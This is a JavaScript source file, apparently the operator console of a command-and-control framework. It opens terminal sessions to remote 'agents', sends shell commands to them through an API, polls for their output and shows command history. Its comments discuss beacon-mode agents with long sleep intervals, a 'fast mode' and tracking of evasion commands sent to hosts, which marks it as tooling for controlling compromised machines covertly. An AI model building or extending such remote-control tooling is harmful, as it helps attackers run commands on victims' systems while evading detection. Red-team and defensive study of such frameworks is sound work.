window.Terminal = {
    activeSessionId: null,

    open(id, hostname) {
        this.activeSessionId = id;

        document.getElementById('term-title').textContent = `Session #${id} - ${hostname}`;
        document.getElementById('terminal-modal').classList.remove('hidden');

        const container = document.getElementById('term-output');
        container.innerHTML = '';

        this.log('Secure connection established.', 'text-gray-500');
        this.log('Loading history...', 'text-gray-600 italic');

        setTimeout(() => {
            const input = document.getElementById('term-input');
            if (input) input.focus();
        }, 50);

        this.loadHistory(id);
    },

    async loadHistory(id) {
        try {
            const cleanUrl = window.Auth.url.replace(/\/$/, '');
            const res = await fetch(`${cleanUrl}/api/hosts/${id}/history`, {
                headers: { 'X-API-KEY': window.Auth.key }
            });

            if (!res.ok) throw new Error(`History request failed (HTTP ${res.status})`);

            const logs = await res.json();

            const container = document.getElementById('term-output');
            container.innerHTML = '';
            this.log('Secure connection established.', 'text-gray-500');

            if (logs.length === 0) {
                this.log('No previous history.', 'text-gray-600 italic text-xs');
            }

            logs.forEach(entry => {
                const time = new Date(entry.timestamp).toLocaleTimeString();
                this.log(`[${time}] Output (Req #${entry.request_id}):`, 'text-blue-400 font-bold text-xs mt-2');
                if (entry.command) this.log(`$ ${entry.command}`, 'text-gray-500 font-mono text-xs');
                if (entry.output)  this.log(entry.output, 'text-green-300 font-mono whitespace-pre-wrap');
                if (entry.error)   this.log(`STDERR: ${entry.error}`, 'text-red-400 font-mono whitespace-pre-wrap');
            });

            container.scrollTop = container.scrollHeight;

        } catch (e) {
            this.log(`[-] Error loading history: ${e.message}`, 'text-red-500');
        }
    },

    close() {
        this.activeSessionId = null;
        document.getElementById('terminal-modal').classList.add('hidden');
    },

    log(text, classes = '') {
        const div = document.createElement('div');
        div.className = classes;
        div.textContent = text;
        const container = document.getElementById('term-output');
        if (container) {
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
        }
    },

    async sendCommand(cmd) {
        if (!cmd) return;
        const id = this.activeSessionId;

        // Echo command immediately so the user sees it before the network round-trip.
        this.log(`$ ${cmd}`, 'text-white font-bold font-mono mt-2');

        // FIX: The server-side send_command endpoint blocks for up to 30 seconds
        // waiting for the agent to acknowledge the command via a oneshot channel.
        // If the agent is in beacon mode with a long sleep, this produces a 30-second
        // silent wait followed by a 504 timeout. Show a status line immediately so
        // the user knows the command is in-flight.
        const statusDiv = document.createElement('div');
        statusDiv.className = 'text-yellow-600 italic text-xs';
        statusDiv.textContent = '⟳ Sending… (waiting for agent acknowledgment)';
        const container = document.getElementById('term-output');
        if (container) {
            container.appendChild(statusDiv);
            container.scrollTop = container.scrollHeight;
        }

        try {
            const cleanUrl = window.Auth.url.replace(/\/$/, '');
            const res = await fetch(`${cleanUrl}/api/hosts/${id}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-API-KEY': window.Auth.key },
                body: JSON.stringify({ command: cmd })
            });

            // Remove the "Sending…" indicator however the request ended.
            statusDiv.remove();

            let data;
            try {
                data = await res.json();
            } catch (_) {
                // Non-JSON response (e.g. a proxy or gateway returning HTML on error).
                this.log(`[-] Server returned non-JSON (HTTP ${res.status})`, 'text-red-500');
                return;
            }

            if (res.status === 504 || data?.error?.includes('timed out')) {
                // FIX: The 30-second callback timeout fires when the agent hasn't
                // checked in within that window. This is normal for beacon-mode agents
                // with long sleep intervals. Give actionable guidance instead of a raw
                // JSON error blob.
                this.log(
                    '[-] Agent did not acknowledge in 30 s. It is likely in beacon mode (long sleep). ' +
                    'Activate fast mode from the Sessions page and try again.',
                    'text-yellow-400'
                );
                return;
            }

            if (!res.ok || data.status !== 'queued') {
                const msg = data?.error || JSON.stringify(data);
                this.log(`[-] Error: ${msg}`, 'text-red-500');
                return;
            }

            this.log(
                `[+] Queued (Req #${data.request_id}) — waiting for output…`,
                'text-gray-500 italic text-xs'
            );
            this.pollOutput(id, data.request_id);
            if (window.UI) window.UI.addLog(`Sent "${cmd}" to Session #${id}`);
            // Update evasion badges immediately for evasion commands so the
            // host-table badge row reflects the new state without waiting for
            // a full history re-fetch.
            window.EvasionFlags?.onCommand(id, cmd);

        } catch (e) {
            statusDiv.remove();
            this.log(`[-] Network error: ${e.message}`, 'text-red-500');
        }
    },

    pollOutput(sessId, reqId) {
        let attempts = 0;
        const cleanUrl = window.Auth.url.replace(/\/$/, '');
        const MAX_ATTEMPTS = 60; // 60 × 1 s = 60 s max wait

        const poller = setInterval(async () => {
            attempts++;

            if (attempts > MAX_ATTEMPTS) {
                clearInterval(poller);
                this.log('[-] Timed out waiting for output.', 'text-red-500');
                return;
            }

            try {
                const res = await fetch(`${cleanUrl}/api/hosts/${sessId}/output/${reqId}`, {
                    headers: { 'X-API-KEY': window.Auth.key }
                });

                if (res.status === 200) {
                    const data = await res.json();
                    clearInterval(poller);

                    // FIX: Only show the exit-code line when it is non-zero.
                    // A command that succeeds silently (no stdout, no stderr,
                    // exit_code 0) would previously show nothing at all — the
                    // user had no idea the command completed. Confirm completion.
                    if (data.output) {
                        this.log(data.output, 'text-green-300 font-mono whitespace-pre-wrap');
                    }
                    if (data.error) {
                        this.log(`STDERR: ${data.error}`, 'text-red-400 font-mono');
                    }
                    if (!data.output && !data.error) {
                        this.log('(no output)', 'text-gray-600 italic text-xs');
                    }
                    if (data.exit_code !== 0) {
                        this.log(`[Exit: ${data.exit_code}]`, 'text-gray-500 text-xs');
                    }
                    return;
                }

                // 404 means "not ready yet" — keep polling silently.
                if (res.status === 404) return;

                // FIX: Any other status (401, 403, 500, …) previously cleared the
                // interval with no message, leaving the terminal in a silent hang.
                // Surface the problem now so the user knows what happened.
                if (res.status === 401 || res.status === 403) {
                    clearInterval(poller);
                    this.log('[-] Auth error while polling for output. Try logging in again.', 'text-red-500');
                    return;
                }

                clearInterval(poller);
                this.log(`[-] Unexpected status ${res.status} while polling for output.`, 'text-red-500');

            } catch (e) {
                // FIX: Previously `clearInterval(poller)` with no message — silent failure.
                // Now we log the error so the user knows polling stopped.
                clearInterval(poller);
                this.log(`[-] Network error while polling: ${e.message}`, 'text-red-500');
            }
        }, 1000);
    }
};
